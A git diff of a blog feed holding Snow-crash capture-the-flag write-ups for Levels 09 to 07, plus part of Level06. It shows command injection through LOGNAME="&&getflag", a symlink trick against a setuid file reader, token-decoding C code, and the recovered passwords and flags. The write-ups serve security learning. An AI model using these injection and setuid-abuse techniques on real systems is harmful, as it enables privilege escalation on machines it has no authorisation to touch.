@@ -1,128 +1,1000 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-30T01:13:53+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Site Title</title><subtitle>An amazing website.</subtitle><author><name>Your Name</name></author><entry><title type="html">Snow-crash Level00</title><link href="http://localhost:4000/level00/" rel="alternate" type="text/html" title="Snow-crash Level00" /><published>2023-11-29T00:00:00+01:00</published><updated>2023-11-29T00:00:00+01:00</updated><id>http://localhost:4000/level00</id><content type="html" xml:base="http://localhost:4000/level00/"><![CDATA[<h4 id="1-first-connect-to-ssh-with-your-ip-address-">1. First, connect to ssh with your ip address :</h4>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-09T10:23:03+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DévEnCours</title><subtitle>Un carnet d’essais, d’erreurs et d’apprentissages.</subtitle><author><name>Yoo</name></author><entry><title type="html">Weeklypaper</title><link href="http://localhost:4000/WeeklyPaper/" rel="alternate" type="text/html" title="Weeklypaper" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>http://localhost:4000/WeeklyPaper</id><content type="html" xml:base="http://localhost:4000/WeeklyPaper/"><![CDATA[]]></content><author><name>Yoo</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Snow-crash Level09</title><link href="http://localhost:4000/Level09/" rel="alternate" type="text/html" title="Snow-crash Level09" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/Level09</id><content type="html" xml:base="http://localhost:4000/Level09/"><![CDATA[<h4 id="1-the-password-of-level09-is-the-token-that-got-from-level08">1. The password of <code class="language-plaintext highlighter-rouge">Level09</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level08</code>.</h4>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i ~/.ssh/id_rsa.pub level00@165.22.17.96 -p 4242
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
 </code></pre></div></div>
-<p>you will see…</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   _____                      _____               _
-  / ____|                    / ____|             | |
- | (___  _ __   _____      _| |     _ __ __ _ ___| |__
-  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
-  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
- |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
-  Good luck &amp; Have fun
+<h4 id="2-so-try-login-to-level09-with-the-password-we-got-from-level08-and-try-to-put-the-command-ls-we-can-see-the-files-level09-and-token-and-try-to-cat-and-execute-as-we-did-in-previous-exercises">2. So, try login to Level09 with the password we got from Level08 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the files <code class="language-plaintext highlighter-rouge">Level09</code> and <code class="language-plaintext highlighter-rouge">token</code>. and try to <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">execute</code> as we did in previous exercises.</h4>
 
-          46.101.129.15 10.114.0.2
-level00@206.189.251.157's password:
-</code></pre></div></div>
-<h4 id="2--you-will-be-able-to-register-using-the-following-couple-of-loginpassword-level00level00">2.  you will be able to register using the following couple of login:password: level00:level00.</h4>
-
-<p>Then, try to put the command ‘ls’ or ‘ls -la’ to look inside the file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@206.189.251.157's password:
-level00@SnowCrash:~$ ls
-level00@SnowCrash:~$ ls -la
-total 12
-dr-xr-x---+ 1 level00 level00 100 Mar 5 2016 .
-d--x--x--x 1 root users 340 Aug 30 2015 ..
--r-xr-x---+ 1 level00 level00 220 Apr 3 2012 .bash_logout
--r-xr-x---+ 1 level00 level00 3518 Aug 30 2015 .bashrc
--r-xr-x---+ 1 level00 level00 675 Apr 3 2012 .profile
-</code></pre></div></div>
-<h4 id="3-nothing-can-be-found-with-ls-or-ls--la">3. Nothing can be found with ‘ls’ or ‘ls -la’</h4>
-
-<p>Once registered, you’re gonna have to find the password that will log you in with the “flagXX” account(XX = current level number).</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~$ su flag00
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag08@SnowCrash:~<span class="nv">$ </span>su level09
 Password:
-su: Authentication failure
-level00@SnowCrash:~$
-</code></pre></div></div>
-<h4 id="4-so-we-need-to-find-the-account-who-use-flag00-written-in-the-subject-so-try-to-put-the-command-as-below-to-find-the-flag00-in-the-file-type">4. So, we need to find the account who use flag00 (written in the subject). So, try to put the command as below to find the flag00 in the file type.</h4>
-
-<p><code class="language-plaintext highlighter-rouge">find / -type f -user flag00</code></p>
-
-<ol>
-  <li>
-    <p>find / : Starts the search from the root directory. This search will include all directories and subdirecotires</p>
-  </li>
-  <li>
-    <p>-user flag00 : Specifices the search criterion. It looks for files owned by the user with the username “flag00”</p>
-  </li>
-  <li>
-    <p>-exec ls -l {} \;: Executes the ls -l command on each file found. The {} is a placeholder for the current file, and \; signifies the end of the -exec command.</p>
-  </li>
-  <li>
-    <p>2&gt;/dev/null: Redirects standard error (file descriptor 2) to /dev/null, effectively discarding error messages. This is done to suppress error messages related to inaccessible directories or files due to permission issues.</p>
-  </li>
-</ol>
-
-<h4 id="5-there-are-only-2-file-paths-which-doesnt-show-permission-denied-among-the-many-resulting-files">5. There are only 2 file paths which doesn’t show “Permission denied” among the many resulting files.</h4>
-
-<p><code class="language-plaintext highlighter-rouge">/usr/sbin/john</code></p>
-
-<p><code class="language-plaintext highlighter-rouge">/rofs/usr/sbin/john</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>....
-....
-/tmp': Permission denied
-/usr/sbin/john
-find: `/var/cache/ldconfig': Permission denied
-find: `/var/lib/php5': Permission denied
-find: `/var/lib/sudo': Permission denied
-find: `/var/spool/cron/atjobs': Permission denied
-find: `/var/spool/cron/atspool': Permission denied
-find: `/var/spool/cron/crontabs': Permission denied
-find: `/var/tmp': Permission denied
-find: `/var/www/level04': Permission denied
-find: `/var/www/level12': Permission denied
-find: `/rofs/etc/chatscripts': Permission denied
-find: `/rofs/etc/ppp/peers': Permission denied
-find: `/rofs/etc/ssl/private': Permission denied
-find: `/rofs/home': Permission denied
-find: `/rofs/root': Permission denied
-/rofs/usr/sbin/john
-find: `/rofs/var/cache/ldconfig': Permission denied
-find: `/rofs/var/lib/php5': Permission denied.
-...
-...
-</code></pre></div></div>
-<h4 id="6-they-possess-the-same-password-as-cdiiddwpgswtgt">6. They possess the same password as cdiiddwpgswtgt</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~$ cat /usr/sbin/john
-cdiiddwpgswtgt
-level00@SnowCrash:~$ cat /rofs/usr/sbin/john
-cdiiddwpgswtgt
-level00@SnowCrash:~$
+level09@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+dr-x------ 1 level09 level09  140 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x 1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span> 1 level09 level09  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span> 1 level09 level09 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span> 1 level09 level09  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-sr-x</span> 1 flag09  level09 7640 Mar  5  2016 level09
+<span class="nt">----r--r--</span> 1 flag09  level09   26 Mar  5  2016 token
+level09@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>token
+f4kmm6p|<span class="o">=</span>�p�n��DB�Du<span class="o">{</span>��
+level09@SnowCrash:~<span class="nv">$ </span>./level09
+You need to provied only one arg.
 </code></pre></div></div>
 
-<h4 id="7-but-it-was-not-the-correct-password-we-can-possibly-think-maybe-this-password-is-encyrpted-in-this-case-we-need-to-decrypt-them">7. But, it was NOT the correct password. We can possibly think, maybe this password is encyrpted? in this case, we need to decrypt them.</h4>
+<h4 id="3-execute-ltrace-with-level09-file">3. Execute ltrace with level09 file.</h4>
 
-<p>ROT 13?</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@SnowCrash:~<span class="nv">$ </span>ltrace ./level09
+__libc_start_main<span class="o">(</span>0x80487ce, 1, 0xbffff7a4, 0x8048aa0, 0x8048b10 &lt;unfinished ...&gt;
+ptrace<span class="o">(</span>0, 0, 1, 0, 0xb7e2fe38<span class="o">)</span>                    <span class="o">=</span> <span class="nt">-1</span>
+puts<span class="o">(</span><span class="s2">"You should not reverse this"</span>You should not reverse this
+<span class="o">)</span>               <span class="o">=</span> 28
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</code></pre></div></div>
+<h4 id="4-execute-level09-with-token">4. Execute ./level09 with token</h4>
 
-<p>Letter substitution cipher
-ROT are short for Rotate
-Each letter in alphabet has a numeric position(1-26)
-A = position 1
-B = position 2
-Z = position 26 (last position)
-Rotate : Replaces each word with the 13th letter after it
-After position(p) greater than 26, letters reset to p-26
-ROT13 Reverse Translation</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@SnowCrash:~$ ./level09 token
+tpmhr
+level09@SnowCrash:~$ ./level09 1
+1
+level09@SnowCrash:~$ ./level09 12
+13
+level09@SnowCrash:~$ ./level09 123
+135
+level09@SnowCrash:~$ ./level09 1234
+1357
+level09@SnowCrash:~$ ./level09 12345
+13579
+level09@SnowCrash:~$ ./level09 a
+a
+level09@SnowCrash:~$ ./level09 ab
+ac
+level09@SnowCrash:~$ ./level09 abc
+ace
+level09@SnowCrash:~$ ./level09 aaaaaa
+abcdef
+</code></pre></div></div>
 
-<p>Alphabet position -13
-if this value is negative, then substract the absolute value of it from 26
-This is the new position
-REF : https://www.dcode.fr/chiffre-rot</p>
+<p>I put different value after the ./level09 and seems like there’s a pattern. When I executed the string character, I got the result as below. Same logic for the same character of string.</p>
 
-<p>So I tried to use the first decrypted result (ROT 15), so that’s how we got the result!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>input: abcd
 
-<p><code class="language-plaintext highlighter-rouge">nottoohardhere</code></p>
+a - index 0, ascii + 0, output a
+b - index 1, ascii + 1, output c
+c - index 2, ascii + 2, output e
+d - index 3, ascii + 3, output g
 
-<h4 id="8-voila--with-getflag-command-we-got-a-token-for-next-level01">8. Voila ! with getflag command, we got a token for next level01!</h4>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~$ su flag00
+
+output: acegi
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 - index 0, ascii + 0, output 1
+2 - index 1, ascii + 1, output 3
+3 - index 2, ascii + 2, output 5
+4 - index 3, ascii + 3, output 7
+// the index value has been added for each char.
+</code></pre></div></div>
+
+<p>Each character in the input string is transformed based on its position in the string, and the transformed result is printed.</p>
+
+<h4 id="5-so-all-we-have-to-do-is-to-create-the-code-to-transforme-it-this-function-transforms-a-given-string-by-subtracting-an-index-value-from-each-characters-ascii-value-and-then-prints-the-result">5. So, all we have to do is to create the code to transforme it. This function transforms a given string by subtracting an index value from each character’s ASCII value and then prints the result.</h4>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">flag</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Only one argument, please </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">flag</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">flag</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="o">*</span><span class="n">flag</span> <span class="o">-</span> <span class="n">i</span><span class="p">);</span>
+		<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+		<span class="n">flag</span><span class="o">++</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This is the program written by C to transforme the characters.</p>
+
+<p>How to use ? Try to compile inside the tmp directory to avoid the permission denied issues.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@SnowCrash:~$ cd /tmp
+level09@SnowCrash:/tmp$ vi flag.c
+level09@SnowCrash:/tmp$ gcc flag.c -o flag
+level09@SnowCrash:/tmp$ cd ~
+level09@SnowCrash:~$ cat token | xargs /tmp/flag
+f3iji1ju5yuevaus41q1afiuq
+</code></pre></div></div>
+<p>This command performs a transformation on the content of the file named “token” using a custom program located at “/tmp/flag”. Let’s break it down:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">cat token</code>: This command reads the content of the file named “token” and outputs it to the standard output.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">|</code>: This symbol is called a pipe and it is used to pass the output of one command as the input to another command.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">xargs /tmp/flag</code>: This command takes each line of input from the previous command (the content of “token”) and passes it as an argument to the program located at “/tmp/flag”.</p>
+  </li>
+</ul>
+
+<p>So, in summary, this command reads the content of the file “token”, passes each line of content as an argument to the program “/tmp/flag”, and performs some transformation on it.</p>
+
+<h4 id="6-so-we-found-our-password-lets-put-our-password-into-flag08-for-level09">6. So, we found our password! Let’s put our password into flag08 for level09.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@SnowCrash:~$ cat token | xargs /tmp/flag
+f3iji1ju5yuevaus41q1afiuq
+</code></pre></div></div>
+<h4 id="7-finally-we-got-a-token-for-level10">7. finally, we got a token for level10</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@SnowCrash:~$ su flag09
 Password:
 Don't forget to launch getflag !
-flag00@SnowCrash:~$ getflag
-Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
-flag00@SnowCrash:~$
-</code></pre></div></div>]]></content><author><name>Your Name</name></author><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry></feed>
+flag09@SnowCrash:~$ getflag
+Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level08</title><link href="http://localhost:4000/Level08/" rel="alternate" type="text/html" title="Snow-crash Level08" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/Level08</id><content type="html" xml:base="http://localhost:4000/Level08/"><![CDATA[<h4 id="1-the-password-of-level08-is-the-token-that-got-from-level07">1. The password of <code class="language-plaintext highlighter-rouge">Level08</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level07</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
+</code></pre></div></div>
+
+<h4 id="2-so-try-login-to-level08-with-the-password-we-got-from-level07-and-try-to-put-the-command-ls-we-can-see-the-files-level08-and-token-and-try-to-cat-and-execute">2. So, try login to Level08 with the password we got from Level07 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the files <code class="language-plaintext highlighter-rouge">Level08</code> and <code class="language-plaintext highlighter-rouge">token</code>. and try to <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">execute</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>su level08
+Password:
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span>  1 level08 level08  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span>  1 level08 level08 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span>  1 level08 level08  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-s---</span>+ 1 flag08  level08 8617 Mar  5  2016 level08
+<span class="nt">-rw-------</span>  1 flag08  flag08    26 Mar  5  2016 token
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>token
+<span class="nb">cat</span>: token: Permission denied
+level08@SnowCrash:~<span class="nv">$ </span>./level08
+./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
+</code></pre></div></div>
+
+<p>We can see <code class="language-plaintext highlighter-rouge">cat: token: Permission denied</code> and <code class="language-plaintext highlighter-rouge">execute: ./level08 [file to read]</code>.</p>
+
+<h4 id="3--then-try-to-ltrace">3 . then, try to ltrace</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>ltrace ./level08
+__libc_start_main<span class="o">(</span>0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 &lt;unfinished ...&gt;
+<span class="nb">printf</span><span class="o">(</span><span class="s2">"%s [file to read]</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"./level08"</span>./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
+<span class="o">)</span>        <span class="o">=</span> 25
+<span class="nb">exit</span><span class="o">(</span>1 &lt;unfinished ...&gt;
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>Same for the ltrace command, we need a another file to be read.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>./level08 token
+You may not access <span class="s1">'token'</span>
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">chmod</span> +x token
+<span class="nb">chmod</span>: changing permissions of <span class="sb">`</span>token<span class="s1">': Operation not permitted
+</span></code></pre></div></div>
+
+<h4 id="4-so-since-we-dont-have-any-access-lets-create-the-symbolic-link-as-we-did-in-previous-exercises">4. So, since we don’t have any access, let’s create the <code class="language-plaintext highlighter-rouge">symbolic link</code> as we did in previous exercises.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span><span class="nb">pwd</span>
+/home/user/level08
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/user/level08/token /tmp/level08flag
+level08@SnowCrash:~<span class="nv">$ </span>./level08 /tmp/level08flag
+quif5eloekouj29ke0vouxean
+</code></pre></div></div>
+
+<h4 id="5-so-we-found-our-password-lets-put-our-password-into-flag08-for-level09">5. So, we found our password! Let’s put our password into flag08 for level09.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+</code></pre></div></div>
+
+<h4 id="6-we-got-a-toekn-for-level-09">6. We got a toekn for level 09.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level07</title><link href="http://localhost:4000/Level07/" rel="alternate" type="text/html" title="Snow-crash Level07" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/Level07</id><content type="html" xml:base="http://localhost:4000/Level07/"><![CDATA[<h4 id="1-the-password-of-level07-is-the-token-that-got-from-level06">1. The password of <code class="language-plaintext highlighter-rouge">Level07</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level06</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
+</code></pre></div></div>
+
+<h4 id="2-so-try-login-to-level07-with-the-password-we-got-from-level06-and-try-to-put-the-command-ls-we-can-see-the-file-level07-and-try-to-execute">2. So, try login to Level07 with the password we got from Level06 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the file <code class="language-plaintext highlighter-rouge">Level07</code>. and try to execute.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@SnowCrash:~<span class="nv">$ </span>su level07
+Password:
+level07@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x 1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span> 1 level07 level07  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span> 1 level07 level07 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span> 1 level07 level07  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-sr-x</span> 1 flag07  level07 8805 Mar  5  2016 level07
+level07@SnowCrash:~<span class="nv">$ </span>./level07
+level07
+</code></pre></div></div>
+<h4 id="3-try-to-put-file-command">3. Try to put <code class="language-plaintext highlighter-rouge">file</code> command</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>file level07
+level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
+</code></pre></div></div>
+<p>It’s a binary file.</p>
+
+<h4 id="4-so-lets-use-ltrace-command-to-understandto-debug-the-behavior-of-this-program">4. So, let’s use ltrace command to understand/to debug the behavior of this program</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>ltrace ./level07
+__libc_start_main<span class="o">(</span>0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 &lt;unfinished ...&gt;
+getegid<span class="o">()</span>                                 <span class="o">=</span> 2007
+geteuid<span class="o">()</span>                                 <span class="o">=</span> 2007
+setresgid<span class="o">(</span>2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
+setresuid<span class="o">(</span>2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
+getenv<span class="o">(</span><span class="s2">"LOGNAME"</span><span class="o">)</span>                         <span class="o">=</span> <span class="s2">"level07"</span>
+asprintf<span class="o">(</span>0xbffff6f4, 0x8048688, 0xbfffff2c, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 18
+system<span class="o">(</span><span class="s2">"/bin/echo level07 "</span>level07
+ &lt;unfinished ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                    <span class="o">=</span> 0
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div></div>
+<p>We can see the getenv(“LOGNAME”) = “level07”</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ echo $LOGNAME
+level07
+</code></pre></div></div>
+<h4 id="5-try-to-do-the-small-tests-as-below">5. Try to do the small tests as below.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ export LOGNAME="HELLO_WORLD";
+level07@SnowCrash:~$ ./level07
+HELLO_WORLD
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ export
+declare -x HOME="/home/user/level07"
+declare -x LANG="en_US.UTF-8"
+declare -x LC_CTYPE="UTF-8"
+declare -x LC_TERMINAL="iTerm2"
+declare -x LC_TERMINAL_VERSION="3.4.23"
+declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
+declare -x LESSOPEN="| /usr/bin/lesspipe %s"
+declare -x LOGNAME="HELLO_WORLD"
+</code></pre></div></div>
+<p>We can see the line <code class="language-plaintext highlighter-rouge">declare -x LOGNAME="HELLO_WORLD"</code></p>
+
+<h4 id="6-so-then-we-try-to-put-getflag-in-the-logname">6. So then, we try to put getflag in the LOGNAME.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">LOGNAME</span><span class="o">=</span><span class="s2">"&amp;&amp;getflag"</span>
+level07@SnowCrash:~<span class="nv">$ </span>./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+</code></pre></div></div>
+
+<h4 id="7-we-got-a-token-for-level-08">7. We got a token for level 08.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level06</title><link href="http://localhost:4000/Level06/" rel="alternate" type="text/html" title="Snow-crash Level06" /><published>2024-02-14T00:00:00+09:00</published><updated>2024-02-14T00:00:00+09:00</updated><id>http://localhost:4000/Level06</id><content type="html" xml:base="http://localhost:4000/Level06/"><![CDATA[<h4 id="1-the-password-of-level06-is-the-token-that-got-from-level05">1. The password of <code class="language-plaintext highlighter-rouge">Level06</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level05</code>.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>viuaaale9huek52boumoomioc
+</code></pre></div></div>
+<h4 id="2-so-try-login-to-level06-with-the-password-we-got-from-level05-and-try-to-put-the-command-ls-we-can-see-the-file-level06">2. So, try login to Level06 with the password we got from Level05 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the file <code class="language-plaintext highlighter-rouge">Level06</code>.</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span>su level06
+Password:
+level06@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span>  1 level06 level06  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span>  1 level06 level06 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span>  1 level06 level06  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-x---</span>+ 1 flag06  level06 7503 Aug 30  2015 level06
+<span class="nt">-rwxr-x---</span>  1 flag06  level06  356 Mar  5  2016 level06.php
+level06@SnowCrash:~<span class="nv">$ </span>./level06
+PHP Warning:  file_get_contents<span class="o">()</span>: Filename cannot be empty <span class="k">in</span> /home/user/level06/level06.php on line 4
+</code></pre></div></div>
+
